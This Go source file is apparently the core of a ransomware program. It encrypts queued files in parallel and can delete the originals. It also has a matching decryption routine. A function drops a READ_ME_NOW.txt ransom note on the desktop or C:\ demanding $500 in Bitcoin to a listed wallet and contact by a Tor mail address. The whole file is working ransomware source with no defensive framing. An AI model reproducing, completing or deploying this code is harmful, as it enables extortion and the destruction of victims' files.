package main

import (
	"crypto/sha1"
	"encoding/hex"
	"io/ioutil"
	"main/src/cli"
	wcc "main/src/crypto"
	. "main/src/utils"
	"os"
	"path/filepath"
	"sync"
)

func StartEncryption(q *Queue, key string) int {
	keyBytes, err := hex.DecodeString(key)
	wg := new(sync.WaitGroup)
	if err != nil {
		panic("Hex decode failed")
	}
	for {
		file := q.Pop()
		if len(file) == 0 {
			break
		}
		wg.Add(1)
		go func() {
			defer wg.Done()
			wcc.EncryptFile(file, "", keyBytes)
			if cli.Settings.Delete {
				os.Remove(file)
			}
		}()
	}
	wg.Wait()
	if cli.Settings.LeaveNote {
		leaveRansomNote(key)
	}
	return 0
}

func StartDecryption(q *Queue, key string) int {
	keyBytes, err := hex.DecodeString(key)
	wg := new(sync.WaitGroup)
	if err != nil {
		panic("Hex decode failed")
	}
	for {
		file := q.Pop()
		if len(file) == 0 {
			break
		}
		wg.Add(1)
		go func() {
			defer wg.Done()
			wcc.DecryptFile(file, keyBytes)
		}()
	}
	wg.Wait()
	return 0
}

func leaveRansomNote(key string) {
	var note = `
		You are a victim of ransomware hacker attack!
		Your files have been encrypted by a strong security algorithm. They are NOT comming back. No amount of googling will help you.
		There is only one way to return your files: obtain the key. Only way to get he key is to pay the ransom.
		Pay the ransom to the following Bitcoin address: 178Dg2rMxVF9Ux8TpZbad3SoWoga6qb3N9
		Ransom amount is 500$.
		Send email with TXID (tansaction ID) in the title and HASH in body to nonna@mail2tor.com
		If you've done everything correctly you will receve key and instructions on how to recover the files.
		You don't have much time.
		Hash is: `

	sha := sha1.New()
	sha.Write([]byte(key))
	keyHash := sha.Sum(nil)
	signedNote := note + hex.EncodeToString(keyHash)

	fileName := "READ_ME_NOW.txt"
	filePath := filepath.Join(GetDesktopLocation(), fileName)
	_, err := os.OpenFile(filePath, os.O_CREATE, os.ModeAppend)
	if err != nil {
		filePath = "C:\\" + fileName
	}
	err = ioutil.WriteFile(filePath, []byte(signedNote), 0777)
	if err != nil {
		filePath = fileName
		ioutil.WriteFile(filePath, []byte(signedNote), 0777)
	}
}
